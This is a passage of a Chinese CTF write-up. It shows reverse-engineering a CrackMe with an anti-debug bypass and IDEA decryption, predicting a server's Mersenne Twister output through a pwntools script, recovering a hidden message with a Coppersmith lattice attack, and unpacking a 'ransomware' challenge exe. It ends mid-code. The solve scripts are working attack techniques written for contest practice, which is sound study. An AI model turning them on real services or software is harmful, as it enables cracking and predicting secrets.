CrackMe\n\n有反调试，在WinMain开头断点，使用ScyllaHide一把梭去除（（。\n\n![](/images/47-1744626745338-52.png)\n\n![](/images/48-1744626745338-53.png)\n\n从WinMain可以跟踪到窗口消息函数，图四就是验证函数按钮消息。\n\n![](/images/49-1744626745338-54.png)\n\n![](/images/50-1744626745338-55.png)\n\n![](/images/51-1744626745338-56.png)\n\n![](/images/52-1744626745338-57.png)\n\n从TLS那边可以看到启动了一个线程，线程函数如下\n\n![](/images/53-1744626745339-58.png)\n\n这边死循环判断了一个值，然后调用CallBack，随便输入flag，点击验证，发现会先调用CallBack中的mark2函数进行第一次验证。\n\n![](/images/54-1744626745339-59.png)\n\n将这边v4都异或上0xBB会得到\"flag{\"五个字符，就明白这边是检测输入flag开头是否为\"flag{\"，进行了第一次验证，然后继续下一次验证进入了case 5的mark3函数。\n\n![](/images/55-1744626745339-60.png)\n\nmark3这边是用固定值生成了一个v5数值列表，a1是输入的字符串，但是可以看到+5跳过了前面的五个字符，然后对括号内的前7个字符做一些加密计算然后和v5列表前7个数值进行检验。\n\n这边就可以直接提取v5生成的数值列表，然后利用爆破得到括号内的前七个字符。\n\n![](/images/56-1744626745339-61.png)\n\n爆破代码：\n\n```cpp\n  unsigned int box1[] = {\n        0x00000000, 0xC0BA6CAC, 0x5A05DF1B, 0x9ABFB3B7, 0xB40BBE36, 0x74B1D29A,\n        0xEE0E612D, 0x2EB40D81, 0xB3667A2F, 0x73DC1683, 0xE963A534, 0x29D9C998, 0x076DC419, 0xC7D7A8B5,\n        0x5D681B02, 0x9DD277AE, 0xBDBDF21D, 0x7D079EB1, 0xE7B82D06, 0x270241AA, 0x09B64C2B, 0xC90C2087,\n        0x53B39330, 0x9309FF9C, 0x0EDB8832, 0xCE61E49E, 0x54DE5729, 0x94643B85, 0xBAD03604, 0x7A6A5AA8,\n        0xE0D5E91F, 0x206F85B3, 0xA00AE279, 0x60B08ED5, 0xFA0F3D62, 0x3AB551CE, 0x14015C4F, 0xD4BB30E3,\n        0x4E048354, 0x8EBEEFF8, 0x136C9856, 0xD3D6F4FA, 0x4969474D, 0x89D32BE1, 0xA7672660, 0x67DD4ACC,\n        0xFD62F97B, 0x3DD895D7, 0x1DB71064, 0xDD0D7CC8, 0x47B2CF7F, 0x8708A3D3, 0xA9BCAE52, 0x6906C2FE,\n        0xF3B97149, 0x33031DE5, 0xAED16A4B, 0x6E6B06E7, 0xF4D4B550, 0x346ED9FC, 0x1ADAD47D, 0xDA60B8D1,\n        0x40DF0B66, 0x806567CA, 0x9B64C2B1, 0x5BDEAE1D, 0xC1611DAA, 0x01DB7106, 0x2F6F7C87, 0xEFD5102B,\n        0x756AA39C, 0xB5D0CF30, 0x2802B89E, 0xE8B8D432, 0x72076785, 0xB2BD0B29, 0x9C0906A8, 0x5CB36A04,\n        0xC60CD9B3, 0x06B6B51F, 0x26D930AC, 0xE6635C00, 0x7CDCEFB7, 0xBC66831B, 0x92D28E9A, 0x5268E236,\n        0xC8D75181, 0x086D3D2D, 0x95BF4A83, 0x5505262F, 0xCFBA9598, 0x0F00F934, 0x21B4F4B5, 0xE10E9819,\n        0x7BB12BAE, 0xBB0B4702, 0x3B6E20C8, 0xFBD44C64, 0x616BFFD3, 0xA1D1937F, 0x8F659EFE, 0x4FDFF252,\n        0xD56041E5, 0x15DA2D49, 0x88085AE7, 0x48B2364B, 0xD20D85FC, 0x12B7E950, 0x3C03E4D1, 0xFCB9887D,\n        0x66063BCA, 0xA6BC5766, 0x86D3D2D5, 0x4669BE79, 0xDCD60DCE, 0x1C6C6162, 0x32D86CE3, 0xF262004F,\n        0x68DDB3F8, 0xA867DF54, 0x35B5A8FA, 0xF50FC456, 0x6FB077E1, 0xAF0A1B4D, 0x81BE16CC, 0x41047A60,\n        0xDBBBC9D7, 0x1B01A57B, 0xEDB88321, 0x2D02EF8D, 0xB7BD5C3A, 0x77073096, 0x59B33D17, 0x990951BB,\n        0x03B6E20C, 0xC30C8EA0, 0x5EDEF90E, 0x9E6495A2, 0x04DB2615, 0xC4614AB9, 0xEAD54738, 0x2A6F2B94,\n        0xB0D09823, 0x706AF48F, 0x5005713C, 0x90BF1D90, 0x0A00AE27, 0xCABAC28B, 0xE40ECF0A, 0x24B4A3A6,\n        0xBE0B1011, 0x7EB17CBD, 0xE3630B13, 0x23D967BF, 0xB966D408, 0x79DCB8A4, 0x5768B525, 0x97D2D989,\n        0x0D6D6A3E, 0xCDD70692, 0x4DB26158, 0x8D080DF4, 0x17B7BE43, 0xD70DD2EF, 0xF9B9DF6E, 0x3903B3C2,\n        0xA3BC0075, 0x63066CD9, 0xFED41B77, 0x3E6E77DB, 0xA4D1C46C, 0x646BA8C0, 0x4ADFA541, 0x8A65C9ED,\n        0x10DA7A5A, 0xD06016F6, 0xF00F9345, 0x30B5FFE9, 0xAA0A4C5E, 0x6AB020F2, 0x44042D73, 0x84BE41DF,\n        0x1E01F268, 0xDEBB9EC4, 0x4369E96A, 0x83D385C6, 0x196C3671, 0xD9D65ADD, 0xF762575C, 0x37D83BF0,\n        0xAD678847, 0x6DDDE4EB, 0x76DC4190, 0xB6662D3C, 0x2CD99E8B, 0xEC63F227, 0xC2D7FFA6, 0x026D930A,\n        0x98D220BD, 0x58684C11, 0xC5BA3BBF, 0x05005713, 0x9FBFE4A4, 0x5F058808, 0x71B18589, 0xB10BE925,\n        0x2BB45A92, 0xEB0E363E, 0xCB61B38D, 0x0BDBDF21, 0x91646C96, 0x51DE003A, 0x7F6A0DBB, 0xBFD06117,\n        0x256FD2A0, 0xE5D5BE0C, 0x7807C9A2, 0xB8BDA50E, 0x220216B9, 0xE2B87A15, 0xCC0C7794, 0x0CB61B38,\n        0x9609A88F, 0x56B3C423, 0xD6D6A3E9, 0x166CCF45, 0x8CD37CF2, 0x4C69105E, 0x62DD1DDF, 0xA2677173,\n        0x38D8C2C4, 0xF862AE68, 0x65B0D9C6, 0xA50AB56A, 0x3FB506DD, 0xFF0F6A71, 0xD1BB67F0, 0x11010B5C,\n        0x8BBEB8EB, 0x4B04D447, 0x6B6B51F4, 0xABD13D58, 0x316E8EEF, 0xF1D4E243, 0xDF60EFC2, 0x1FDA836E,\n        0x856530D9, 0x45DF5C75, 0xD80D2BDB, 0x18B74777, 0x8208F4C0, 0x42B2986C, 0x6C0695ED, 0xACBCF941,\n        0x36034AF6, 0xF6B9265A, 0xCCCCCCCC, 0xCCCCCC00, 0x00000100, 0x00000000, 0xF6B9265A, 0xCCCCCCCC,\n        0x00000008, 0x00000000};\n\n    uint32_t enc1[]{\n        0x46A95BAD,\n        0x1CAC84B6,\n        0xA67CB2B2,\n        0x32188937,\n        0x4872D39F,\n        0xF2A2E59B,\n        0x011B94D2,\n    };\n\n    // 爆破前7字节\n    for (int i = 0; i < 7; i++)\n    {\n        for (int c = 28; c < 132; c++)\n        {\n            if ((~box1[(uint8_t)c ^ 0x79] ^ 0xB0E0E879) == enc1[i])\n            {\n                printf(\"%c\", c);\n                break;\n            }\n        }\n    }\n```\n\n得到前七个字符为：**moshui_**\n\n第三次Check是在case 0处，程序起始的时候启了一个线程，死循环然后这边判断前两次Check是否成功，然后进入最后一次Check代码。\n\n![](/images/57-1744626745339-63.png)\n\n![](/images/58-1744626745339-62.png)\n\n开始的时候利用前五个字节以及括号内前七个字节生成了两个四字节密钥，然后又赋值了另外两个固定的密钥值。\n\n由于前五字节和括号内前七个字节是已知固定的，所以生成的密钥也是固定，可以直接提取计算完的密钥。\n\n密钥：**0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF**\n\n![](/images/59-1744626745339-64.png)\n\n然后下面赋值了密文到v7，判断输入的字符串第29个字符是否为'}'，这边可知flag长度为29，然后利用密钥和输入字符串，进行加密，最后和v7判断。\n\n![](/images/60-1744626745339-65.png)\n\n加密是8字节8字节加密，观察sub_7FF7ADAB1640可知是IDEA加密算法，循环加密0x10000次没什么用，因为Input和Output在两个不同数组，所以和加密一次是一样结果。\n\n利用IDEA解密算法配合密钥解密v7的值即可得到后16字节，最后拼接得到完整flag。\n\n![](/images/61-1744626745339-66.png)\n\n解密代码：\n\n```cpp\n#include <iostream>\n#include <bitset>\n#include <cmath>\n#include <windows.h>\n#include <algorithm>\nusing namespace std;\n\ntypedef bitset<16> code;\ntypedef bitset<128> key;\n\nbitset<16> sub_key[52];\nbitset<16> inv_sub_key[52];\n\ncode XOR(code code_1, code code_2)\n{\n    return code_1 ^ code_2;\n}\n\ncode Plus(code code_1, code code_2)\n{\n    int tmp = 0;\n    for (int i = 0; i < 16; i++)\n    {\n        tmp += code_1[i] * pow(2, i) + code_2[i] * pow(2, i);\n    }\n    tmp %= 65536;\n    return bitset<16>(tmp);\n}\n\ncode invPlus(code code_in)\n{\n    int tmp = 0;\n    for (int i = 0; i < 16; i++)\n        tmp += code_in[i] * pow(2, i);\n    tmp = 65536 - tmp;\n    return bitset<16>(tmp);\n}\n\ncode Times(code code_1, code code_2)\n{\n    long long tmp_1 = 0, tmp_2 = 0;\n    for (int i = 0; i < 16; i++)\n    {\n        tmp_1 += code_1[i] * pow(2, i);\n        tmp_2 += code_2[i] * pow(2, i);\n    }\n    if (tmp_1 == 0)\n        tmp_1 = 65536;\n    if (tmp_2 == 0)\n        tmp_2 = 65536;\n    long long tmp = (tmp_1 * tmp_2) % 65537;\n    return bitset<16>(tmp == 65536 ? 0 : tmp);\n}\n\nvoid Exgcd(int a, int b, int &x, int &y)\n{\n    if (!b)\n        x = 1, y = 0;\n    else\n        Exgcd(b, a % b, y, x), y -= a / b * x;\n}\n\ncode invTimes(code code_in)\n{\n    int tmp = 0;\n    for (int i = 0; i < 16; i++)\n        tmp += code_in[i] * pow(2, i);\n    int x, y;\n    int p = 65537;\n    Exgcd(tmp, p, x, y);\n    x = (x % p + p) % p;\n    return bitset<16>(x);\n}\n\nvoid subkeys_get(code keys_input[8])\n{\n    key keys;\n    for (int i = 0; i < 8; i++)\n        for (int j = 0; j < 16; j++)\n            keys[j + 16 * i] = keys_input[7 - i][j];\n\n    for (int i = 0; i < 8; i++)\n        for (int j = 0; j < 16; j++)\n            sub_key[i][15 - j] = keys[127 - (j + 16 * i)];\n\n    for (int i = 0; i < 5; i++)\n    {\n        key tmp_keys = keys >> 103;\n        keys = (keys << 25) | tmp_keys;\n        for (int j = (8 + 8 * i); j < (8 * (i + 2)); j++)\n            for (int k = 0; k < 16; k++)\n                sub_key[j][15 - k] = keys[127 - (k + 16 * (j - 8 - 8 * i))];\n    }\n\n    key tmp_keys = keys >> 103;\n    keys = (keys << 25) | tmp_keys;\n    for (int i = 48; i < 52; i++)\n        for (int j = 0; j < 16; j++)\n            sub_key[i][15 - j] = keys[127 - (j + 16 * (i - 48))];\n}\n\nvoid inv_subkeys_get(code sub_key[52])\n{\n    for (int i = 6; i < 48; i += 6)\n    {\n        inv_sub_key[i] = invTimes(sub_key[48 - i]);\n        inv_sub_key[i + 1] = invPlus(sub_key[50 - i]);\n        inv_sub_key[i + 2] = invPlus(sub_key[49 - i]);\n        inv_sub_key[i + 3] = invTimes(sub_key[51 - i]);\n    }\n\n    for (int i = 0; i < 48; i += 6)\n    {\n        inv_sub_key[i + 4] = sub_key[46 - i];\n        inv_sub_key[i + 5] = sub_key[47 - i];\n    }\n\n    inv_sub_key[0] = invTimes(sub_key[48]);\n    inv_sub_key[1] = invPlus(sub_key[49]);\n    inv_sub_key[2] = invPlus(sub_key[50]);\n    inv_sub_key[3] = invTimes(sub_key[51]);\n\n    inv_sub_key[48] = invTimes(sub_key[0]);\n    inv_sub_key[49] = invPlus(sub_key[1]);\n    inv_sub_key[50] = invPlus(sub_key[2]);\n    inv_sub_key[51] = invTimes(sub_key[3]);\n}\n\nbitset<64> dencrypt(bitset<64> cipher)\n{\n    bitset<16> I_1, I_2, I_3, I_4;\n    for (int i = 0; i < 16; i++)\n    {\n        I_1[15 - i] = cipher[63 - i];\n        I_2[15 - i] = cipher[47 - i];\n        I_3[15 - i] = cipher[31 - i];\n        I_4[i] = cipher[i];\n    }\n    for (int i = 0; i < 48; i += 6)\n    {\n        bitset<16> tmp_1 = Times(inv_sub_key[i], I_1);\n        bitset<16> tmp_2 = Plus(inv_sub_key[i + 1], I_2);\n        bitset<16> tmp_3 = Plus(inv_sub_key[i + 2], I_3);\n        bitset<16> tmp_4 = Times(inv_sub_key[i + 3], I_4);\n        bitset<16> tmp_5 = XOR(tmp_1, tmp_3);\n        bitset<16> tmp_6 = XOR(tmp_2, tmp_4);\n        bitset<16> tmp_7 = Times(inv_sub_key[i + 4], tmp_5);\n        bitset<16> tmp_8 = Plus(tmp_6, tmp_7);\n        bitset<16> tmp_9 = Times(tmp_8, inv_sub_key[i + 5]);\n        bitset<16> tmp_10 = Plus(tmp_7, tmp_9);\n        I_1 = XOR(tmp_1, tmp_9);\n        I_2 = XOR(tmp_3, tmp_9);\n        I_3 = XOR(tmp_2, tmp_10);\n        I_4 = XOR(tmp_4, tmp_10);\n    }\n    bitset<16> Y_1 = Times(I_1, inv_sub_key[48]);\n    bitset<16> Y_2 = Plus(I_3, inv_sub_key[49]);\n    bitset<16> Y_3 = Plus(I_2, inv_sub_key[50]);\n    bitset<16> Y_4 = Times(I_4, inv_sub_key[51]);\n\n    bitset<64> plaint;\n    for (int i = 0; i < 16; i++)\n    {\n        plaint[i] = Y_4[i];\n        plaint[i + 16] = Y_3[i];\n        plaint[i + 32] = Y_2[i];\n        plaint[i + 48] = Y_1[i];\n    }\n    return plaint;\n}\n\nint main()\n{\n    unsigned int box1[] = {\n        0x00000000, 0xC0BA6CAC, 0x5A05DF1B, 0x9ABFB3B7, 0xB40BBE36, 0x74B1D29A,\n        0xEE0E612D, 0x2EB40D81, 0xB3667A2F, 0x73DC1683, 0xE963A534, 0x29D9C998, 0x076DC419, 0xC7D7A8B5,\n        0x5D681B02, 0x9DD277AE, 0xBDBDF21D, 0x7D079EB1, 0xE7B82D06, 0x270241AA, 0x09B64C2B, 0xC90C2087,\n        0x53B39330, 0x9309FF9C, 0x0EDB8832, 0xCE61E49E, 0x54DE5729, 0x94643B85, 0xBAD03604, 0x7A6A5AA8,\n        0xE0D5E91F, 0x206F85B3, 0xA00AE279, 0x60B08ED5, 0xFA0F3D62, 0x3AB551CE, 0x14015C4F, 0xD4BB30E3,\n        0x4E048354, 0x8EBEEFF8, 0x136C9856, 0xD3D6F4FA, 0x4969474D, 0x89D32BE1, 0xA7672660, 0x67DD4ACC,\n        0xFD62F97B, 0x3DD895D7, 0x1DB71064, 0xDD0D7CC8, 0x47B2CF7F, 0x8708A3D3, 0xA9BCAE52, 0x6906C2FE,\n        0xF3B97149, 0x33031DE5, 0xAED16A4B, 0x6E6B06E7, 0xF4D4B550, 0x346ED9FC, 0x1ADAD47D, 0xDA60B8D1,\n        0x40DF0B66, 0x806567CA, 0x9B64C2B1, 0x5BDEAE1D, 0xC1611DAA, 0x01DB7106, 0x2F6F7C87, 0xEFD5102B,\n        0x756AA39C, 0xB5D0CF30, 0x2802B89E, 0xE8B8D432, 0x72076785, 0xB2BD0B29, 0x9C0906A8, 0x5CB36A04,\n        0xC60CD9B3, 0x06B6B51F, 0x26D930AC, 0xE6635C00, 0x7CDCEFB7, 0xBC66831B, 0x92D28E9A, 0x5268E236,\n        0xC8D75181, 0x086D3D2D, 0x95BF4A83, 0x5505262F, 0xCFBA9598, 0x0F00F934, 0x21B4F4B5, 0xE10E9819,\n        0x7BB12BAE, 0xBB0B4702, 0x3B6E20C8, 0xFBD44C64, 0x616BFFD3, 0xA1D1937F, 0x8F659EFE, 0x4FDFF252,\n        0xD56041E5, 0x15DA2D49, 0x88085AE7, 0x48B2364B, 0xD20D85FC, 0x12B7E950, 0x3C03E4D1, 0xFCB9887D,\n        0x66063BCA, 0xA6BC5766, 0x86D3D2D5, 0x4669BE79, 0xDCD60DCE, 0x1C6C6162, 0x32D86CE3, 0xF262004F,\n        0x68DDB3F8, 0xA867DF54, 0x35B5A8FA, 0xF50FC456, 0x6FB077E1, 0xAF0A1B4D, 0x81BE16CC, 0x41047A60,\n        0xDBBBC9D7, 0x1B01A57B, 0xEDB88321, 0x2D02EF8D, 0xB7BD5C3A, 0x77073096, 0x59B33D17, 0x990951BB,\n        0x03B6E20C, 0xC30C8EA0, 0x5EDEF90E, 0x9E6495A2, 0x04DB2615, 0xC4614AB9, 0xEAD54738, 0x2A6F2B94,\n        0xB0D09823, 0x706AF48F, 0x5005713C, 0x90BF1D90, 0x0A00AE27, 0xCABAC28B, 0xE40ECF0A, 0x24B4A3A6,\n        0xBE0B1011, 0x7EB17CBD, 0xE3630B13, 0x23D967BF, 0xB966D408, 0x79DCB8A4, 0x5768B525, 0x97D2D989,\n        0x0D6D6A3E, 0xCDD70692, 0x4DB26158, 0x8D080DF4, 0x17B7BE43, 0xD70DD2EF, 0xF9B9DF6E, 0x3903B3C2,\n        0xA3BC0075, 0x63066CD9, 0xFED41B77, 0x3E6E77DB, 0xA4D1C46C, 0x646BA8C0, 0x4ADFA541, 0x8A65C9ED,\n        0x10DA7A5A, 0xD06016F6, 0xF00F9345, 0x30B5FFE9, 0xAA0A4C5E, 0x6AB020F2, 0x44042D73, 0x84BE41DF,\n        0x1E01F268, 0xDEBB9EC4, 0x4369E96A, 0x83D385C6, 0x196C3671, 0xD9D65ADD, 0xF762575C, 0x37D83BF0,\n        0xAD678847, 0x6DDDE4EB, 0x76DC4190, 0xB6662D3C, 0x2CD99E8B, 0xEC63F227, 0xC2D7FFA6, 0x026D930A,\n        0x98D220BD, 0x58684C11, 0xC5BA3BBF, 0x05005713, 0x9FBFE4A4, 0x5F058808, 0x71B18589, 0xB10BE925,\n        0x2BB45A92, 0xEB0E363E, 0xCB61B38D, 0x0BDBDF21, 0x91646C96, 0x51DE003A, 0x7F6A0DBB, 0xBFD06117,\n        0x256FD2A0, 0xE5D5BE0C, 0x7807C9A2, 0xB8BDA50E, 0x220216B9, 0xE2B87A15, 0xCC0C7794, 0x0CB61B38,\n        0x9609A88F, 0x56B3C423, 0xD6D6A3E9, 0x166CCF45, 0x8CD37CF2, 0x4C69105E, 0x62DD1DDF, 0xA2677173,\n        0x38D8C2C4, 0xF862AE68, 0x65B0D9C6, 0xA50AB56A, 0x3FB506DD, 0xFF0F6A71, 0xD1BB67F0, 0x11010B5C,\n        0x8BBEB8EB, 0x4B04D447, 0x6B6B51F4, 0xABD13D58, 0x316E8EEF, 0xF1D4E243, 0xDF60EFC2, 0x1FDA836E,\n        0x856530D9, 0x45DF5C75, 0xD80D2BDB, 0x18B74777, 0x8208F4C0, 0x42B2986C, 0x6C0695ED, 0xACBCF941,\n        0x36034AF6, 0xF6B9265A, 0xCCCCCCCC, 0xCCCCCC00, 0x00000100, 0x00000000, 0xF6B9265A, 0xCCCCCCCC,\n        0x00000008, 0x00000000};\n\n    uint32_t enc1[]{\n        0x46A95BAD,\n        0x1CAC84B6,\n        0xA67CB2B2,\n        0x32188937,\n        0x4872D39F,\n        0xF2A2E59B,\n        0x011B94D2,\n    };\n\n    // 爆破前7字节\n    for (int i = 0; i < 7; i++)\n    {\n        for (int c = 28; c < 132; c++)\n        {\n            if ((~box1[(uint8_t)c ^ 0x79] ^ 0xB0E0E879) == enc1[i])\n            {\n                printf(\"%c\", c);\n                break;\n            }\n        }\n    }\n\n    // 后16字节进行IDEA解密\n    unsigned char enc2[16] = {\n        0x5C, 0x2F, 0xD0, 0xEC, 0x82, 0x0E, 0x67, 0x57,\n        0x6A, 0x9F, 0x91, 0xF6, 0x95, 0xA4, 0xAC, 0x90};\n    // unsigned int key[4] = {\n    //     0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF};\n    unsigned int key[4] = {\n        0x6C98B242, 0x78563412, 0x3E6A6D0D, 0xEFCDAB89};\n\n    code keys_input[8];\n    for (int i = 0; i < 4; i++)\n    {\n        keys_input[2 * i + 1] = key[i] & 0xFFFF;\n        keys_input[2 * i] = (key[i] >> 16) & 0xFFFF;\n    }\n\n    unsigned char result[16];\n    bitset<64> cipher1, cipher2;\n    for (int i = 0; i < 8; i++)\n    {\n        for (int j = 0; j < 8; j++)\n        {\n            cipher1[63 - (i * 8 + j)] = (enc2[i] >> (7 - j)) & 1;\n            cipher2[63 - (i * 8 + j)] = (enc2[i + 8] >> (7 - j)) & 1;\n        }\n    }\n    subkeys_get(keys_input);\n    inv_subkeys_get(sub_key);\n\n    bitset<64> plain1 = dencrypt(cipher1);\n    bitset<64> plain2 = dencrypt(cipher2);\n\n    uint64_t plain1_val = plain1.to_ullong();\n    uint64_t plain2_val = plain2.to_ullong();\n\n    uint8_t dec2[16]{};\n    memcpy(dec2, &plain2_val, 8);\n    memcpy(dec2 + 8, &plain1_val, 8);\n    reverse(dec2, dec2 + 16);\n\n    printf(\"%.16s\\n\", dec2);\n    return 0;\n}\n```\n\nflag{moshui_build_this_block}\n\n\n\n## Crypto\n\n### Division\n\n```python\nwhile True:\n    choose = input(': >>> ')\n    if choose == '1':\n        try:\n            denominator = int(input('input the denominator: >>> '))\n        except:\n            print('INPUT NUMBERS')\n            continue\n        nominator = random.getrandbits(32)\n        if denominator == '0':\n            print('NO YOU DONT')\n            continue\n        else:\n            print(f'{nominator}//{denominator} = {nominator//denominator}')\n\n```\n\n题目可以任意获取32字节的数据，直接使用现有的mt19937攻击库即可预测随机数\n\n```python\nfrom pwn import *\nfrom randcrack import RandCrack\nfrom tqdm import tqdm\n\ncontext.log_level = 'debug'\nsh=remote(\"47.94.217.82\",28739 )\ndata=[]\nfor i in range(624):\n    sh.recvuntil(b'>>> ')\n    sh.sendline(b'1')\n    sh.recvuntil(b'tor: >>> ')\n    sh.sendline(b'1')\n    line=int(sh.recvline().decode().split('=')[1].replace('\\n', '').replace(' ', ''))\n    data.append(line)\n\nprint(data)\n\n\nRC = RandCrack()\nfor i in data:\n    RC.submit(i)\n\nsh.sendline(b'2')\nsh.recvuntil(b'er: >>>')\nrand1 = RC.predict_getrandbits(11000)\nrand2 = RC.predict_getrandbits(10000)\ncorrect_ans = rand1 // rand2\n\nsh.sendline(str(correct_ans).encode())\nsh.recvlines()  \n```\n\n> XYCTF{4c4e5327-9cd0-4fb6-b584-878afdffb850}\n\n### Complex_signin\n\n题目构造了复数对象，混淆了m的实部和虚部的低128位,已知\n\n![cry1](/images/cry1-1744626745339-67.png)\n\n二元copper解低位即可\n\n```python\nfrom Crypto.Util.number import *\nfrom Crypto.Cipher import ChaCha20\nimport hashlib\nimport itertools\n\ndef small_roots(f, bounds, m=1, d=None):\n    if not d:\n        d = f.degree()\n\n    R = f.base_ring()\n    N = R.cardinality()\n\n    f /= f.coefficients().pop(0)\n    f = f.change_ring(ZZ)\n\n    G = Sequence([], f.parent())\n    for i in range(m + 1):\n        base = N ^ (m - i) * f ^ i\n        for shifts in itertools.product(range(d), repeat=f.nvariables()):\n            g = base * prod(map(power, f.variables(), shifts))\n            G.append(g)\n\n    B, monomials = G.coefficient_matrix()\n    monomials = vector(monomials)\n\n    factors = [monomial(*bounds) for monomial in monomials]\n    for i, factor in enumerate(factors):\n        B.rescale_col(i, factor)\n\n    B = B.dense_matrix().LLL()\n\n    B = B.change_ring(QQ)\n    for i, factor in enumerate(factors):\n        B.rescale_col(i, 1 / factor)\n\n    H = Sequence([], f.parent().change_ring(QQ))\n    for h in filter(None, B * monomials):\n        H.append(h)\n        I = H.ideal()\n        if I.dimension() == -1:\n            H.pop()\n        elif I.dimension() == 0:\n            roots = []\n            for root in I.variety(ring=ZZ):\n                root = tuple(R(root[var]) for var in f.variables())\n                roots.append(root)\n            return roots\n\n    return []\n\n\nclass Complex:\n    def __init__(self, re, im):\n        self.re = re\n        self.im = im\n\n    def __mul__(self, c):\n        re_ = self.re * c.re - self.im * c.im\n        im_ = self.re * c.im + self.im * c.re\n        return Complex(re_, im_)\n\n    def __eq__(self, c):\n        return self.re == c.re and self.im == c.im\n\n    def __rshift__(self, m):\n        return Complex(self.re >> m, self.im >> m)\n\n    def __lshift__(self, m):\n        return Complex(self.re << m, self.im << m)\n\n    def __str__(self):\n        if self.im == 0:\n            return str(self.re)\n        elif self.re == 0:\n            if abs(self.im) == 1:\n                return f\"{'-' if self.im < 0 else ''}i\"\n            else:\n                return f\"{self.im}i\"\n        else:\n            return f\"{self.re} {'+' if self.im > 0 else '-'} {abs(self.im)}i\"\n\n    def tolist(self):\n        return [self.re, self.im]\n\n\ndef complex_pow(c, exp, n):\n    result = Complex(1, 0)\n    while exp > 0:\n        if exp & 1:\n            result = result * c\n            result.re = result.re % n\n            result.im = result.im % n\n        c = c * c\n        c.re = c.re % n\n        c.im = c.im % n\n        exp >>= 1\n    return result\n\nn = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753\nmh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]\nC = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]\nenc = b'\\x9c\\xc4n\\x8dF\\xd9\\x9e\\xf4\\x05\\x82!\\xde\\xfe\\x012$\\xd0\\x8c\\xaf\\xfb\\rEb(\\x04)\\xa1\\xa6\\xbaI2J\\xd2\\xb2\\x898\\x11\\xe6x\\xa9\\x19\\x00pn\\xf6rs- \\xd2\\xd1\\xbe\\xc7\\xf51.\\xd4\\xd2 \\xe7\\xc6\\xca\\xe5\\x19\\xbe'\n\nPR.<x,y>=Zmod(int(n))[]\na=mh[0]+x\nb=mh[1]+y\nf1=a^3-3*a*b^2-C[0]\n\nroots=small_roots(f1,bounds=(2**129,2**129),m=5,d=3)\nprint(roots[0])\n\nm=Complex(mh[0]+roots[0][0],mh[1]+roots[0][1])\nprint(str(m.re + m.im))\n\ndec=ChaCha20.new(key=hashlib.sha256(str(m.re + m.im).encode()).digest(), nonce=b'Pr3d1ctmyxjj')\nprint(dec.decrypt(enc))\n```\n\n> XYCTF{Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge}\n\n### 勒索病毒\n\n题目给出了exe和加密的16进制数据\n\npyinstxtractor反编译一下，编译task.pyc看到注释的代码\n\n```python\nimport re\nimport base64\nimport os\nimport sys\nfrom gmssl import sm4\nfrom Crypto.Util.Padding import pad\nimport binascii\nfrom random import shuffle, randrange\n\nN = 49 \np = 3\nq = 128  \nd = 3\nassert q > (6 * d + 1) * p\nR.<x> = ZZ[]\ndef generate_T(d1, d2):\n    assert N >= d1 + d2\n    s = [1] * d1 + [-1] * d2 + [0] * (N - d1 - d2)\n    shuffle(s)\n    return R(s)\n\ndef invert_mod_prime(f, p):\n    Rp = R.change_ring(Integers(p)).quotient(x^N - 1)\n    return R(lift(1 / Rp(f)))\n\ndef convolution(f, g):\n    return (f * g) % (x^N - 1)\n\ndef lift_mod(f, q):\n    return R([((f[i] + q // 2) % q) - q // 2 for i in range(N)])\n\ndef poly_mod(f, q):\n    return R([f[i] % q for i in range(N)])\n\ndef invert_mod_pow2(f, q):\n    assert q.is_power_of(2)\n    g = invert_mod_prime(f, 2)\n    while True:\n        r = lift_mod(convolution(g, f), q)\n        if r == 1:\n            return g\n        g = lift_mod(convolution(g, 2 - r), q)\n\ndef generate_message():\n    return R([randrange(p) - 1 for _ in range(N)])\n\ndef generate_key():\n    while True:\n        try:\n            f = generate_T(d + 1, d)\n            g = generate_T(d, d)\n            Fp = poly_mod(invert_mod_prime(f, p), p)\n            Fq = poly_mod(invert_mod_pow2(f, q), q)\n            break\n        except:\n            continue\n    h = poly_mod(convolution(Fq, g), q)\n    return h, (f, g)\n\ndef encrypt_message(m, h):\n    e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q)\n    return e\n\ndef save_ntru_keys():\n    h, secret = generate_key()\n    with open(\"pub_key.txt\", \"w\") as f:\n        f.write(str(h))\n    m = generate_message()\n    with open(\"priv_key.txt\", \"w\") as f:\n        f.write(str(m))\n    e = encrypt_message(m, h)\n    with open(\"enc.txt\", 